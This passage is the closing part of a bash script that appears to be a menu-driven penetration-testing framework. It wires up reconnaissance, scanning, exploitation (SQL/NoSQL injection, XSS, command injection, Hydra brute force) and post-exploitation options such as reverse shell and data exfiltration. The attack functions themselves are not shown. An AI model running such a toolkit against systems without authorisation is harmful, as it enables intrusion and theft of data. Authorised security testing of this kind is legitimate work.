    exploit_sqlmap

    # Phase 4
    banner
    print_section "PHASE 4: POST-EXPLOITATION"
    postex_data_exfiltration

    # Phase 5
    generate_report

    # Final summary
    banner
    print_section "FULL PENETRATION TEST COMPLETED!"
    print_success "All phases completed successfully!"
    echo ""
    print_info "Summary:"
    echo "  ✓ Reconnaissance completed"
    echo "  ✓ Vulnerability scanning completed"
    echo "  ✓ Exploitation tests completed"
    echo "  ✓ Post-exploitation completed"
    echo "  ✓ Report generated"
    echo ""
    print_info "All results saved to: ${OUTPUT_DIR}/"
    print_info "Final report: ${OUTPUT_DIR}/pentest-report.txt"
    echo ""
    read -p "Press Enter to return to main menu..."
}

###############################################################################
# MENU SYSTEM
###############################################################################

show_menu() {
    banner
    echo -e "${BOLD}${CYAN}═══════════════════════ MAIN MENU ═══════════════════════${NC}"
    echo ""
    echo -e "${GREEN}[1]${NC} Reconnaissance (Nmap, Whatweb, Nikto, DIRB, Gobuster, SSL)"
    echo -e "${GREEN}[2]${NC} Vulnerability Scanning (ZAP, Wfuzz, NPM Audit, WPScan)"
    echo -e "${GREEN}[3]${NC} Exploitation (NoSQL, Traversal, XSS, RCE, SQLMap, XSSer, Commix)"
    echo -e "${GREEN}[4]${NC} Post-Exploitation (Reverse Shell, Data Exfiltration)"
    echo -e "${GREEN}[5]${NC} Generate Penetration Test Report"
    echo ""
    echo -e "${YELLOW}[A]${NC} ${BOLD}Run Full Automated Pentest (ALL PHASES)${NC}"
    echo ""
    echo -e "${CYAN}[T]${NC} Check Target Status"
    echo -e "${CYAN}[C]${NC} Clear Output Directory"
    echo -e "${CYAN}[V]${NC} View Results"
    echo -e "${RED}[Q]${NC} Quit"
    echo ""
    echo -e "${BOLD}${CYAN}═════════════════════════════════════════════════════════${NC}"
}

show_recon_menu() {
    banner
    echo -e "${BOLD}${PURPLE}RECONNAISSANCE MENU${NC}"
    echo ""
    echo -e "${GREEN}[1]${NC} Nmap - Network & Service Discovery"
    echo -e "${GREEN}[2]${NC} Whatweb - Technology Fingerprinting"
    echo -e "${GREEN}[3]${NC} Nikto - Web Server Scanner"
    echo -e "${GREEN}[4]${NC} DIRB - Directory Enumeration"
    echo -e "${GREEN}[5]${NC} Gobuster - Fast Directory Brute Force"
    echo -e "${GREEN}[6]${NC} SSLScan - SSL/TLS Analysis"
    echo -e "${GREEN}[7]${NC} Run All Reconnaissance"
    echo -e "${RED}[B]${NC} Back to Main Menu"
    echo ""
}

show_scan_menu() {
    banner
    echo -e "${BOLD}${PURPLE}VULNERABILITY SCANNING MENU${NC}"
    echo ""
    echo -e "${GREEN}[1]${NC} OWASP ZAP - Baseline Scan"
    echo -e "${GREEN}[2]${NC} Wfuzz - Web Application Fuzzer"
    echo -e "${GREEN}[3]${NC} NPM Audit - Dependency Vulnerabilities"
    echo -e "${GREEN}[4]${NC} WPScan - WordPress Scanner"
    echo -e "${GREEN}[5]${NC} Run All Scans"
    echo -e "${RED}[B]${NC} Back to Main Menu"
    echo ""
}

show_exploit_menu() {
    banner
    echo -e "${BOLD}${PURPLE}EXPLOITATION MENU${NC}"
    echo ""
    echo -e "${GREEN}[1]${NC} NoSQL Injection - Authentication Bypass"
    echo -e "${GREEN}[2]${NC} Directory Traversal - Path Injection"
    echo -e "${GREEN}[3]${NC} Cross-Site Scripting (XSS)"
    echo -e "${GREEN}[4]${NC} Command Injection - RCE"
    echo -e "${GREEN}[5]${NC} Information Disclosure - ST Traversal"
    echo -e "${GREEN}[6]${NC} SQLMap - Automated SQL/NoSQL Injection"
    echo -e "${GREEN}[7]${NC} XSSer - Automated XSS Detection"
    echo -e "${GREEN}[8]${NC} Commix - Command Injection Exploiter"
    echo -e "${GREEN}[9]${NC} Hydra - Brute Force Authentication"
    echo -e "${GREEN}[10]${NC} Run All Exploits"
    echo -e "${RED}[B]${NC} Back to Main Menu"
    echo ""
}

show_postex_menu() {
    banner
    echo -e "${BOLD}${PURPLE}POST-EXPLOITATION MENU${NC}"
    echo ""
    echo -e "${GREEN}[1]${NC} Reverse Shell - Setup Instructions"
    echo -e "${GREEN}[2]${NC} Data Exfiltration"
    echo -e "${RED}[B]${NC} Back to Main Menu"
    echo ""
}

check_target_status() {
    banner
    print_section "TARGET STATUS CHECK"
    check_target
    echo ""
    read -p "Press Enter to continue..."
}

clear_output() {
    banner
    print_section "CLEAR OUTPUT DIRECTORY"
    print_warning "This will delete all files in: ${OUTPUT_DIR}"
    read -p "Are you sure? (y/N): " confirm

    if [[ "$confirm" == "y" || "$confirm" == "Y" ]]; then
        rm -rf "${OUTPUT_DIR}"/*
        mkdir -p "${OUTPUT_DIR}"
        print_success "Output directory cleared"
    else
        print_info "Operation cancelled"
    fi

    read -p "Press Enter to continue..."
}

view_results() {
    banner
    print_section "VIEW RESULTS"

    if [ -z "$(ls -A ${OUTPUT_DIR} 2>/dev/null)" ]; then
        print_warning "No results found in ${OUTPUT_DIR}"
    else
        print_info "Files in ${OUTPUT_DIR}:"
        ls -lah "${OUTPUT_DIR}"
    fi

    echo ""
    read -p "Press Enter to continue..."
}

###############################################################################
# MAIN PROGRAM
###############################################################################

main() {
    # Parse command line arguments
    parse_arguments "$@"

    # Main menu loop
    while true; do
        show_menu
        read -p "$(echo -e ${BOLD}${CYAN}'Select option: '${NC})" choice

        case $choice in
            1)
                while true; do
                    show_recon_menu
                    read -p "$(echo -e ${BOLD}${CYAN}'Select option: '${NC})" recon_choice
                    case $recon_choice in
                        1) recon_nmap ;;
                        2) recon_whatweb ;;
                        3) recon_nikto ;;
                        4) recon_dirb ;;
                        5) recon_gobuster ;;
                        6) recon_sslscan ;;
                        7) recon_all ;;
                        [Bb]) break ;;
                        *) print_error "Invalid option" ; sleep 1 ;;
                    esac
                done
                ;;
            2)
                while true; do
                    show_scan_menu
                    read -p "$(echo -e ${BOLD}${CYAN}'Select option: '${NC})" scan_choice
                    case $scan_choice in
                        1) scan_zap_baseline ;;
                        2) scan_wfuzz ;;
                        3) scan_npm_audit ;;
                        4) scan_wpscan ;;
                        5) scan_all ;;
                        [Bb]) break ;;
                        *) print_error "Invalid option" ; sleep 1 ;;
                    esac
                done
                ;;
            3)
                while true; do
                    show_exploit_menu
                    read -p "$(echo -e ${BOLD}${CYAN}'Select option: '${NC})" exploit_choice
                    case $exploit_choice in
                        1) exploit_nosql_injection ;;
                        2) exploit_directory_traversal ;;
                        3) exploit_xss ;;
                        4) exploit_command_injection ;;
                        5) exploit_info_disclosure ;;
                        6) exploit_sqlmap ;;
                        7) exploit_xsser ;;
                        8) exploit_commix ;;
                        9) exploit_hydra ;;
                        10) exploit_all ;;
                        [Bb]) break ;;
                        *) print_error "Invalid option" ; sleep 1 ;;
                    esac
                done
                ;;
            4)
                while true; do
                    show_postex_menu
                    read -p "$(echo -e ${BOLD}${CYAN}'Select option: '${NC})" postex_choice
                    case $postex_choice in
                        1) postex_reverse_shell_info ;;
                        2) postex_data_exfiltration ;;
                        [Bb]) break ;;
                        *) print_error "Invalid option" ; sleep 1 ;;
                    esac
                done
                ;;
            5) generate_report ;;
            [Aa]) run_full_pentest ;;
            [Tt]) check_target_status ;;
            [Cc]) clear_output ;;
            [Vv]) view_results ;;
            [Qq])
                echo -e "${GREEN}Exiting... Stay secure!${NC}"
                exit 0
                ;;
            *)
                print_error "Invalid option"
                sleep 1
                ;;
        esac
    done
}

# Run main program with all arguments
main "$@"
